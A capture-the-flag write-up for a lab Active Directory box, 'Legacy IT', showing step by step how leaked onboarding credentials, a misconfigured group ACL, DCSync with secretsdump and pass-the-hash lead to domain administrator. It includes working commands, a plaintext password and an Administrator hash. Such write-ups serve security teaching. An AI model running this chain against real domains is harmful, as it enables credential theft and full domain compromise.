---
title: "Legacy IT"
ctf: "platypwnies 2026"
date: 2026-11-14
category: ad
difficulty: 1
points: n/a
flag_format: "PP{...}"
author: "author"
flags:
 - "PP{l3g4cy-1t-4dm1ns-4k4-w1nd0ws-4dm1ns::mRbRuGCSEzE-} (Administrator's Desktop)"
---

# Legacy IT

**Target:** DC01 / `easyad.local` — `10.83.11.236` (live instance)
**Our VPN IP:** `10.82.0.63` (dev `pp2026-vpn`)

## Summary

A single easy Windows AD domain with a "compatibility group for retired administration tooling".
Null SMB session (signing disabled, null auth allowed) reads a world-readable `Public` share that
hands over the new starter's credentials. Recon shows the domain is hardened the "modern" way —
LDAP signing enforced, SMBv1 off, `ms-DS-MachineAccountQuota=0`, functional level 2025, no
lockout — and offers **no** kerberoastable or AS-REP-roastable accounts. The way in is a **DACL
chain**: the trainee has `FullControl` on a compatibility group, and that group holds
`GetChanges` + `GetChangesAll` on the domain. Add yourself to the group, `DCSync` the
Administrator hash, pass-the-hash, read the flag off `C$`. No relay and no coercion are needed.

## Solution / Exploit

### Step 1 — Null session → the `Public` share

SMB signing is disabled and null auth is allowed, so an anonymous session enumerates and **reads**
the `Public` share:

```bash
nxc smb 10.83.11.236 # signing disabled / null auth OK
smbclient -N //10.83.11.236/Public
```

`onboarding.txt` (saved in `artifacts/`) contains:

```
Domain: easyad.local Username: trainee Password: Welcome-To-IT-2026!
```

### Step 2 — Recon as `trainee`

- LDAP **signing is Enforced** → use LDAPS (636) for all LDAP writes/reads that matter.
- SMBv1 off; `ms-DS-MachineAccountQuota=0` (no self-created machine accounts for RBCD); domain
 functional level 2025; **no lockout threshold**.
- No kerberoastable and no AS-REP-roastable accounts.

### Step 3 — Find the extra group (RID brute)

SAMR RID enumeration surfaces a non-default group **RID 1104**:

```
"Legacy IT Admins" — "Compatibility group for retired administration tooling"
```

### Step 4 — Read the ACLs (the actual bug)

```bash
dacledit.py -use-ldaps \
 -dc-ip 10.83.11.236 easyad.local/trainee:'Welcome-To-IT-2026!' \
 -target "Legacy IT Admins" -action read
```

`trainee` has **FullControl (0xf01ff)** on `CN=Legacy IT Admins`. BloodHound confirms the group
holds **`GetChanges` + `GetChangesAll` on the domain** — i.e. **DCSync rights**:

```
trainee --GenericAll--> "Legacy IT Admins" --GetChanges/All--> DOMAIN
```

### Step 5 — Add yourself to the group over LDAPS

The simplest write is adding `trainee` to the group over LDAPS with NTLM auth (`add_member.py`,
`ldap3`). A **fresh bind** afterwards is needed so the new group membership lands in the token:

```bash
python3 artifacts/add_member.py
# [+] bound as EASYAD\trainee
# [*] modify result: True
# [+] verify members: ['CN=Jamie Smith,CN=Users,DC=easyad,DC=local']
```

(`artifacts/VERIFY-add_member.txt` records the independent verification: the module compiles, the
membership resolves to `CN=Jamie Smith`, and the flag bytes check out at 53 bytes.)

### Step 6 — DCSync the Administrator hash

```bash
secretsdump.py easyad.local/trainee:'Welcome-To-IT-2026!'@10.83.11.236 -just-dc-user Administrator
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:4e0a4dc9096058a1046f972164bac991:::
```

### Step 7 — Pass-the-hash and read the flag

```bash
nxc smb 10.83.11.236 -u Administrator -H 4e0a4dc9096058a1046f972164bac991 -d easyad.local \
 --share C$ --get-file 'Users\Administrator\Desktop\flag.txt' flag.txt
```

## Flag(s)

```
PP{l3g4cy-1t-4dm1ns-4k4-w1nd0ws-4dm1ns::mRbRuGCSEzE-}
```

Exact bytes verified: **53 bytes**, including the trailing `-` inside the braces (it is real).

## Notes / Pitfalls

- **Misleading impacket error:** running `secretsdump` as `trainee` *before* joining the group
 yields `DRSR SessionError 0x20f7` (`ERROR_DS_DRA_BAD_DN`). That is impacket's confusing symptom
 of **insufficient replication rights**, *not* a wrong DN — the DN is fine; you just don't have
 `GetChangesAll` yet.
- **Nothing to relay.** LDAP signing is enforced, so LDAP relay is out; no coercion was attempted
 or needed. The whole box falls to the ACL → DCSync chain.
- **Use LDAPS.** LDAP/389 refuses the writes/targeted reads; `dacledit -use-ldaps` and the
 `ldap3` connection (port 636, `NTLM`) are what work.
- **Re-bind after the group change** before relying on the new rights — the membership is not
 reflected in an existing connection's token.
- The trainee's real DN is `CN=Jamie Smith,CN=Users,DC=easyad,DC=local` (shown by BloodHound);
 the group is `CN=Legacy IT Admins,CN=Users,DC=easyad,DC=local`.

## Artifacts in this folder

| Path | What |
|---|---|
| `LEGACYIT-SOLVE.md` | Original working solve notes (author) |
| `artifacts/onboarding.txt` | The leaked starter creds (from the `Public` share) |
| `artifacts/add_member.py` | ldap3/LDAPS script that adds `trainee` to `Legacy IT Admins` |
| `artifacts/VERIFY-add_member.txt` | Independent verification of membership + flag bytes |
| `artifacts/flag.txt` | Captured flag |
| `artifacts/bh/*.json` | BloodHound collection (users/groups/computers/domains/containers/OUs/GPOs) |
| `artifacts/20261114053613_bloodhound.zip` | BloodHound zip as collected |
| `artifacts/sysvol/reg_*.pol` | Group Policy registry POL files pulled from SYSVOL |
| `chall-info.txt`, `challenge.json` | Platform metadata |
